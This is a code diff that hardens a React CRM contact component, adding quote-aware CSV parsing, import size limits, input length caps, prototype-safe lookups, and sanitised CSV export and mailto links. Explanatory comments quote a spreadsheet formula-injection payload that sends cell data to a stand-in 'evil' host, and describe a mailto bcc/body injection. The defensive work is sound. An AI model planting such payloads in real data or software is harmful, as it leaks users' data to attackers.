@@ -30,6 +30,70 @@ import {
   IconUpload,
   IconWarn,
 } from "./ui";
+import {
+  csvCell,
+  safeMailto,
+  LIMITS,
+  MAX_CSV_BYTES,
+  MAX_IMPORT_ROWS,
+} from "../lib/validate";
+
+/**
+ * Split one CSV line into fields, honouring double-quoted values.
+ *
+ * The previous `line.split(/[,\t]/)` broke on any quoted field containing a
+ * comma — `"Smith, John",Acme` shifted every subsequent column by one, so
+ * company/owner/status/email landed in the wrong fields. (Quoted values
+ * spanning multiple lines are still unsupported; contact exports don't produce
+ * them, and the caller splits on newlines before reaching here.)
+ */
+function splitCsvLine(line: string): string[] {
+  const out: string[] = [];
+  let field = "";
+  let inQuotes = false;
+  for (let i = 0; i < line.length; i++) {
+    const c = line[i];
+    if (inQuotes) {
+      if (c === '"') {
+        // A doubled quote inside a quoted field is a literal quote.
+        if (line[i + 1] === '"') {
+          field += '"';
+          i++;
+        } else {
+          inQuotes = false;
+        }
+      } else {
+        field += c;
+      }
+    } else if (c === '"') {
+      inQuotes = true;
+    } else if (c === "," || c === "\t") {
+      out.push(field.trim());
+      field = "";
+    } else {
+      field += c;
+    }
+  }
+  out.push(field.trim());
+  return out;
+}
+
+/** Channel-styling fallback for a contact with no touchpoints, or an unknown one. */
+const NO_TOUCH = {
+  label: "No touch yet",
+  bg: "#f2f2f0",
+  fg: "#a3a39d",
+  icon: NO_TOUCH_ICON,
+};
+
+/**
+ * OWNERS lookup that can't reach the prototype chain. A bare `OWNERS[name]` with
+ * name === "constructor" returns a function rather than undefined, so the
+ * `|| { … }` fallbacks below would pass a truthy non-Owner through.
+ */
+function ownerMeta(name: string | null | undefined) {
+  return name && Object.hasOwn(OWNERS, name) ? OWNERS[name] : null;
+}
 
 type FormState = {
   name: string;
@@ -64,7 +128,9 @@ type State = {
   actionError: string;
 };
 
-type ActionResult = { ok: true } | { ok: false; error: string };
+// Mirrors the route action's return type. `message` carries a partial-success
+// note — currently "imported N, skipped M invalid rows" from a CSV import.
+type ActionResult = { ok: true; message?: string } | { ok: false; error: string };
 
 const blankForm = (loops?: number[]): FormState => ({
   name: "",
@@ -220,9 +286,15 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
     if (fetcher.state !== "idle" || !fetcher.data) return;
     const result = fetcher.data as ActionResult;
     if (result.ok) {
+      // A partial success (some import rows rejected) holds the modal open so
+      // the user actually sees which rows didn't land — closing it would report
+      // a clean import that wasn't one.
+      const notice = result.message ?? "";
       patch((s) =>
         s.modal
-          ? { modal: null, csvText: "", csvError: "", actionError: "", deleteIds: [] }
+          ? notice
+            ? { csvText: "", csvError: notice, actionError: "", deleteIds: [] }
+            : { modal: null, csvText: "", csvError: "", actionError: "", deleteIds: [] }
           : {},
       );
     } else {
@@ -365,6 +437,16 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
       patch({ csvError: "That doesn’t look like a .csv file.", csvDragging: false });
       return;
     }
+    // Bounded before reading. The whole file is held in component state and
+    // re-serialized into the submitted form, so an unbounded upload is held in
+    // memory twice and POSTed as one body.
+    if (file.size > MAX_CSV_BYTES) {
+      patch({
+        csvError: `That file is too large (max ${Math.round(MAX_CSV_BYTES / 1024 / 1024)}MB).`,
+        csvDragging: false,
+      });
+      return;
+    }
     const reader = new FileReader();
     reader.onload = () =>
       patch({
@@ -446,6 +528,12 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
       const hit = STATUSES.find((x) => x.id.toLowerCase() === s);
       return hit ? hit.id : "New";
     };
+    if (rows.length > MAX_IMPORT_ROWS + 1) {
+      patch({
+        csvError: `That file has too many rows (max ${MAX_IMPORT_ROWS}). Split it and import in batches.`,
+      });
+      return;
+    }
     let start = 0;
     const first = rows[0].toLowerCase();
     if (
@@ -455,7 +543,7 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
       start = 1;
     const made = [];
     for (let i = start; i < rows.length; i++) {
-      const cols = rows[i].split(/[,\t]/).map((x) => x.trim());
+      const cols = splitCsvLine(rows[i]);
       if (!cols[0]) continue;
       const loops = parseLoops(cols[2]);
       made.push({
@@ -625,10 +713,12 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
     .filter((c) => c.email);
   const exportEmails = () => {
     if (!selectedEmails.length) return;
-    const esc = (v: string) => (/[",\n]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v);
+    // csvCell also neutralizes leading = + - @ so a contact named
+    // `=HYPERLINK("https://evil/"&A1,"Click")` is text, not a formula, when the
+    // export is opened in Excel or Sheets.
     const csv =
       "name,email\n" +
-      selectedEmails.map((c) => esc(c.name) + "," + esc(c.email)).join("\n") +
+      selectedEmails.map((c) => csvCell(c.name) + "," + csvCell(c.email)).join("\n") +
       "\n";
     const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
     const url = URL.createObjectURL(blob);
@@ -670,9 +760,9 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
     )
     .slice(0, 8);
   const queue = queueSrc.map(({ c, att }) => {
-    const o = c.owner ? OWNERS[c.owner] : null;
+    const o = ownerMeta(c.owner);
     const last = c.touches[0];
-    const ch = last ? CH[last.ch] : null;
+    const ch = last ? CH[last.ch] ?? NO_TOUCH : null;
     const m = statusMeta(c.status);
     const urgent = !c.owner || (c.followUp !== null && c.followUp <= 0);
     return {
@@ -700,11 +790,13 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
 
   const rows = visible.map((c) => {
     const last = c.touches[0];
-    const ch = last
-      ? CH[last.ch]
-      : { label: "No touch yet", bg: "#f2f2f0", fg: "#a3a39d", icon: NO_TOUCH_ICON };
+    // `?? NO_TOUCH` covers a stored `type` that isn't a known channel key.
+    // Unreachable through the current write paths (both validate against
+    // isValidTouchType) and there is no CHECK constraint on the column, so an
+    // unguarded lookup here would white-screen the whole app for every user.
+    const ch = (last ? CH[last.ch] : null) ?? NO_TOUCH;
     const conflict = hasNameConflict(c, nameIndex);
-    const o = c.owner ? OWNERS[c.owner] : null;
+    const o = ownerMeta(c.owner);
     const m = statusMeta(c.status);
     const statusMenu = STATUSES.map((s) => ({
       label: s.id,
@@ -751,7 +843,7 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
   const sel = contacts.find((c) => c.id === S.selectedId) || null;
   let detail: any = null;
   if (sel) {
-    const o = sel.owner ? OWNERS[sel.owner] : null;
+    const o = ownerMeta(sel.owner);
     const m = statusMeta(sel.status);
     const conflictWith = conflictOwners(sel, nameIndex);
     const conflict = conflictWith.length > 0;
@@ -799,7 +891,12 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
             iconHtml: { __html: CH.email.icon },
             iconWrap: `width:30px;height:30px;border-radius:8px;background:${CH.email.bg};color:${CH.email.fg};display:flex;align-items:center;justify-content:center;flex:0 0 auto;`,
             label: sel.email.trim(),
-            href: "mailto:" + sel.email.trim(),
+            // safeMailto, not string concatenation: a stored address containing
+            // `?bcc=…&subject=…&body=…` would otherwise prefill an
+            // attacker-controlled draft in the user's mail client. Returns null
+            // for anything that isn't a plain address, and the row then renders
+            // as text with no link.
+            href: safeMailto(sel.email),
             external: false,
           }
         : null,
@@ -866,12 +963,12 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
         author: n.author,
         ago: ago(n.daysAgo),
         text: n.text,
-        color: (OWNERS[n.author] || { color: "#b0b0aa" }).color,
-        initial: (OWNERS[n.author] || { initial: "?" }).initial,
+        color: ownerMeta(n.author)?.color ?? "#b0b0aa",
+        initial: ownerMeta(n.author)?.initial ?? "?",
       })),
       lastBy: lastT ? lastT.owner : "-",
       timeline: sel.touches.map((t, i) => {
-        const c2 = CH[t.ch];
+        const c2 = CH[t.ch] ?? NO_TOUCH;
         return {
           channel: c2.label,
           iconHtml: { __html: c2.icon },
@@ -917,8 +1014,8 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
     style: ownerChoice(f.owner === o),
     onClick: () => setForm({ owner: o }),
     hasAvatar: o !== "Unassigned",
-    color: (OWNERS[o] || { color: "" }).color,
-    initial: (OWNERS[o] || { initial: "" }).initial,
+    color: ownerMeta(o)?.color ?? "",
+    initial: ownerMeta(o)?.initial ?? "",
   }));
 
   return (
@@ -1299,9 +1396,9 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
                   <div style={css("border:1px solid #ededea; border-radius:11px; overflow:hidden; background:#fff;")}>
                     {detail.contactInfo.map((ci: any, j: number) => (
                       <Box
-                        as="a"
+                        as={ci.href ? "a" : "div"}
                         key={j}
-                        href={ci.href}
+                        {...(ci.href ? { href: ci.href } : {})}
                         {...(ci.external ? { target: "_blank", rel: "noopener noreferrer" } : {})}
                         style={css(`display:flex; align-items:center; gap:11px; padding:11px 13px; text-decoration:none; color:#2a2a28; ${j > 0 ? "border-top:1px solid #f2f2f0;" : ""}`)}
                         hover={css("background:#faf9f6;")}
@@ -1369,6 +1466,7 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
                     <Box
                       as="textarea"
                       value={S.noteDraft}
+                      maxLength={LIMITS.note}
                       onChange={onNoteInput}
                       onKeyDown={onNoteKey}
                       placeholder={`Add a note as ${detail.viewerName}… (⌘↵ to save)`}
@@ -1457,26 +1555,26 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
                   <div style={css("display:grid; grid-template-columns:1fr 1fr; gap:12px;")}>
                     <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                       <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Name</span>
-                      <Box as="input" value={f.name} onChange={(e: any) => setForm({ name: e.target.value })} placeholder="Full name" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                      <Box as="input" value={f.name} maxLength={LIMITS.name} onChange={(e: any) => setForm({ name: e.target.value })} placeholder="Full name" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                     </label>
                     <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                       <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Company</span>
-                      <Box as="input" value={f.company} onChange={(e: any) => setForm({ company: e.target.value })} placeholder="Company" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                      <Box as="input" value={f.company} maxLength={LIMITS.company} onChange={(e: any) => setForm({ company: e.target.value })} placeholder="Company" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                     </label>
                   </div>
                   <div style={css("display:grid; grid-template-columns:1fr 1fr; gap:12px;")}>
                     <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                       <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Email</span>
-                      <Box as="input" type="email" value={f.email} onChange={(e: any) => setForm({ email: e.target.value })} placeholder="name@company.com" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                      <Box as="input" type="email" value={f.email} maxLength={LIMITS.email} onChange={(e: any) => setForm({ email: e.target.value })} placeholder="name@company.com" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                     </label>
                     <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                       <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Phone</span>
-                      <Box as="input" value={f.phone} onChange={(e: any) => setForm({ phone: e.target.value })} placeholder="+1 (555) 000-0000" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                      <Box as="input" value={f.phone} maxLength={LIMITS.phone} onChange={(e: any) => setForm({ phone: e.target.value })} placeholder="+1 (555) 000-0000" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                     </label>
                   </div>
                   <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                     <span style={css("font-size:12px; font-weight:500; color:#575753;")}>LinkedIn</span>
-                    <Box as="input" value={f.linkedin} onChange={(e: any) => setForm({ linkedin: e.target.value })} placeholder="linkedin.com/in/handle" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                    <Box as="input" value={f.linkedin} maxLength={LIMITS.linkedin} onChange={(e: any) => setForm({ linkedin: e.target.value })} placeholder="linkedin.com/in/handle" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                   </label>
                   <div style={css("display:flex; flex-direction:column; gap:7px;")}>
                     <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Loops</span>
@@ -1488,7 +1586,7 @@ export function SalesLoopCRM({ contacts, viewer }: { contacts: Contact[]; viewer
                   {f.loops.includes(2) && (
                     <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                       <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Community / Event <span style={css("color:#a3a39d; font-weight:450;")}>· where they came from</span></span>
-                      <Box as="input" list="slcrm-sources" value={f.source} onChange={(e: any) => setForm({ source: e.target.value })} placeholder="e.g. Naturally Network Denver, Newtopia" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
+                      <Box as="input" list="slcrm-sources" value={f.source} maxLength={LIMITS.source} onChange={(e: any) => setForm({ source: e.target.value })} placeholder="e.g. Naturally Network Denver, Newtopia" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                       <datalist id="slcrm-sources">
                         {sources.map((s) => (
                           <option key={s} value={s} />
